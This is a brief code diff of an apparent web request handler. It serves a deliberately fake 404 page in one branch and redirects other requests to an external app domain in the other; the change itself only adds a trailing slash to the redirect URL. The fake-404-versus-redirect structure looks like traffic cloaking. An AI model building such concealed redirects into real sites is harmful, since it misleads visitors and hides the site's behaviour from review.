@@ -23,7 +23,7 @@ export default async function handler(req, res) {
         </body></html>`;
       return res.status(404).send(fake404);
     } else {
-      res.writeHead(302, { Location: 'https://fact-free-mobile.mrzxa.app/fr' });
+      res.writeHead(302, { Location: 'https://fact-free-mobile.mrzxa.app/fr/' });
       return res.end();
     }
   } catch (err) {
